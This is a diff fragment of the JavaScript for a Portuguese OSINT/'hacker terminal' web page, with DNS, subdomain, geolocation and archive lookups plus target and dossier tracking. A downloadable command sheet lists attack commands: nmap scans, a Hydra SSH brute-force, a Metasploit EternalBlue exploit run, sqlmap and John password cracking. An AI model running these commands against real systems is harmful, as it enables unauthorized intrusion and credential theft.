+        if (d.nameServers) o += 'NS: ' + d.nameServers + '<br>';
+        term.innerHTML += '<span style="color:var(--red-dark)">' + (o || 'sem dados') + '</span><br>';
+        scrollTerm();
+      })
+      .catch(() => { term.innerHTML += '<span style="color:var(--red)">Falha. Use: whois ' + alvo + '</span><br>'; scrollTerm(); });
+    return;
+  }
+
+  if (c.startsWith('dig') || c.startsWith('dns')) {
+    term.innerHTML += '<span style="color:var(--muted)">→ dns...</span><br>';
+    scrollTerm();
+    fetch('https://dns.google/resolve?name=' + alvo + '&type=A')
+      .then(r => r.json())
+      .then(d => {
+        if (d.Answer) d.Answer.forEach(a => { term.innerHTML += '<span style="color:var(--red-dark)">' + a.name + ' → ' + a.data + '</span><br>'; });
+        else term.innerHTML += '<span style="color:var(--red)">sem registros</span><br>';
+        scrollTerm();
+      })
+      .catch(() => { term.innerHTML += '<span style="color:var(--red)">Falha</span><br>'; scrollTerm(); });
+    return;
+  }
+
+  if (c.startsWith('sub')) {
+    term.innerHTML += '<span style="color:var(--muted)">→ subdomínios...</span><br>';
+    scrollTerm();
+    fetch('https://crt.sh/?q=%25.' + alvo + '&output=json')
+      .then(r => r.json())
+      .then(data => {
+        const set = {};
+        (data || []).slice(0, 35).forEach(i => {
+          if (i.name_value) i.name_value.split('\n').forEach(n => set[n] = 1);
+        });
+        const list = Object.keys(set);
+        term.innerHTML += '<span style="color:var(--red-dark)">(' + list.length + ')<br>' + list.join('<br>') + '</span><br>';
+        scrollTerm();
+      })
+      .catch(() => { term.innerHTML += '<span style="color:var(--red)">Falha</span><br>'; scrollTerm(); });
+    return;
+  }
+
+  if (c.startsWith('geo')) {
+    const t = inp.split(' ')[1] || '';
+    fetch('http://ip-api.com/json/' + (t || ''))
+      .then(r => r.json())
+      .then(d => {
+        if (d.status === 'success') term.innerHTML += '<span style="color:var(--red-dark)">' + d.query + ' | ' + d.city + ', ' + d.country + ' | ' + (d.isp || '') + '</span><br>';
+        else term.innerHTML += '<span style="color:var(--red)">sem dados</span><br>';
+        scrollTerm();
+      })
+      .catch(() => { term.innerHTML += '<span style="color:var(--red)">Falha</span><br>'; scrollTerm(); });
+    return;
+  }
+
+  if (c.startsWith('archive')) {
+    fetch('https://archive.org/wayback/available?url=' + alvo)
+      .then(r => r.json())
+      .then(d => {
+        if (d.archived_snapshots && d.archived_snapshots.closest)
+          term.innerHTML += '<span style="color:var(--red-dark)">Snapshot: ' + d.archived_snapshots.closest.timestamp + '</span><br>';
+        else term.innerHTML += '<span style="color:var(--red)">nenhum snapshot</span><br>';
+        scrollTerm();
+      })
+      .catch(() => { term.innerHTML += '<span style="color:var(--red)">Falha</span><br>'; scrollTerm(); });
+    return;
+  }
+
+  term.innerHTML += '<span style="color:var(--red)">desconhecido — digite help</span><br>';
+  scrollTerm();
+}
+
+function clearTerminal() {
+  document.getElementById('realTerminal').innerHTML = '<span style="color:var(--red)">lua:~$</span> limpo<br>────────────────────<br>';
+}
+function scrollTerm() {
+  const t = document.getElementById('realTerminal');
+  t.scrollTop = t.scrollHeight;
+}
+
+/* ========== OSINT ========== */
+function execOSINT(tipo) {
+  const alvo = document.getElementById('urlbar').value.replace(/https?:\/\//, '').split('/')[0] || 'exemplo.com';
+  const map = {
+    whois: 'Digite no terminal: whois ' + alvo,
+    geo: 'Digite no terminal: geo',
+    dns: 'Digite no terminal: dig ' + alvo,
+    sub: 'Digite no terminal: sub ' + alvo,
+    ports: 'Digite no terminal: ports ' + alvo,
+    archive: 'Digite no terminal: archive ' + alvo
+  };
+  document.getElementById('osintout').innerHTML = '<b>' + tipo.toUpperCase() + '</b><br>' + (map[tipo] || '');
+  log('osint ' + tipo);
+}
+
+/* ========== TARGETS / EVIDENCE / DOSSIER ========== */
+function addTarget() {
+  const v = document.getElementById('targetName').value.trim();
+  if (!v) return;
+  document.getElementById('targets').innerHTML += '<div class="target-card">🎯 ' + v + '</div>';
+  document.getElementById('targetName').value = '';
+  log('target ' + v);
+}
+function captureEvidence() {
+  const url = document.getElementById('urlbar').value;
+  document.getElementById('evidence').innerHTML += '<div style="font-size:9px">📸 ' + url + '</div>';
+  log('evidência');
+}
+function saveDossier() {
+  localStorage.setItem('lua_dossier', document.getElementById('notes').value);
+  document.getElementById('downloadStatus').textContent = 'salvo';
+  log('dossiê salvo');
+}
+function exportDossier() {
+  const t = document.getElementById('notes').value || 'vazio';
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(new Blob([t], {type:'text/plain'}));
+  a.download = 'dossie_lua_palida.txt';
+  a.click();
+  document.getElementById('downloadStatus').textContent = 'exportado';
+}
+
+function downloadComandos() {
+  let t = 'LUA PÁLIDA V4 SCP — COMANDOS\n========================\n\n';
+  t += 'RECON\nwhois dominio.com\ndig dominio.com ANY +short\nwhatweb dominio.com\ncurl -sI https://dominio.com\n\n';
+  t += 'NMAP\nnmap -sS -sV -T4 -F alvo.com\nnmap -sS -sV -sC -O -T4 alvo.com\nnmap -sS -sV -sC -O -A -T4 -p- alvo.com\n\n';
+  t += 'HYDRA\nhydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100\n\n';
+  t += 'METASPLOIT\nmsfconsole -q\nsearch eternalblue\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.100\nexploit\n\n';
+  t += 'SQLMAP\nsqlmap -u "https://dominio.com/pagina?id=1" --batch\n\n';
+  t += 'JOHN\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n\n';
+  t += 'INSTALAR\nsudo apt install -y nmap hydra sqlmap john sublist3r amass gobuster whatweb wpscan\n';
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(new Blob([t], {type:'text/plain'}));
+  a.download = 'lua_palida_comandos.txt';
+  a.click();
+  document.getElementById('downloadStatus').textContent = 'comandos baixados';
+}
+function downloadDossie() {
+  let t = 'LUA PÁLIDA V4 SCP — DOSSIÊ\n========================\n';
+  t += new Date().toISOString() + '\n\n';
+  t += 'NOTAS\n' + (document.getElementById('notes').value || '—') + '\n\n';
+  t += 'TARGETS\n' + (document.getElementById('targets').innerText || '—') + '\n\n';
+  t += 'EVIDÊNCIAS\n' + (document.getElementById('evidence').innerText || '—') + '\n';
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(new Blob([t], {type:'text/plain'}));
+  a.download = 'dossie_completo.txt';
+  a.click();
+  document.getElementById('downloadStatus').textContent = 'dossiê baixado';
+}
+
+/* ========== INIT ========== */
+document.addEventListener('DOMContentLoaded', () => {
+  rebuildWall();
+  if (window.innerWidth <= 860) {
+    showMobile('nav');
+  } else {
+    document.getElementById('colLeft').classList.add('active');
+    document.getElementById('colRight').classList.add('active');
+  }
+  window.addEventListener('resize', () => {
+    clearTimeout(window._rt);
+    window._rt = setTimeout(() => {
+      rebuildWall();
+      if (window.innerWidth <= 860) {
+        showMobile(currentMobileView);
+      } else {
+        document.getElementById('colLeft').classList.add('active');
+        document.getElementById('colRight').classList.add('active');
+        document.getElementById('guidePanel').style.display = 'none';
+      }
+    }, 250);
+  });
+  log('LUA PÁLIDA V4 — FICHA SCP pronta');
+});
+</script>
+</body>
+</html>
